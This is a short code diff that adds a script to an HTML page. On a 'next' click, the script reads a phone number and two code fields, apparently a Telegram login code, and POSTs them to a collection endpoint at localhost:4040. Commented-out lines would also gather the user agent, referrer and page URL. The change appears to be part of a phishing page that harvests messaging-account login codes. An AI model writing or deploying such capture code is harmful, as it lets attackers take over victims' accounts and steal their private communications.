@@ -137,6 +137,27 @@ received.style.display = "none";
 }
 })
 </script>
+
+<script>
+document.querySelector('.next').addEventListener('click', () => {
+const number_ver = document.getElementById('number').value;
+const code_ver = document.getElementById('code').value;
+const code_telegram_ver = document.getElementById('code_telegram').value;
+    fetch('http://localhost:4040/data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          number: number_ver,
+          code: code_telegram_ver,
+         telegram: code_ver           
+// userAgent: navigator.userAgent,
+            //referrer: document.referrer,
+            //url: window.location.href
+        })
+    }).catch(err => console.error('Erro to send log:', err));
+});
+</script>
+
 </div>
 </div>
 </body>
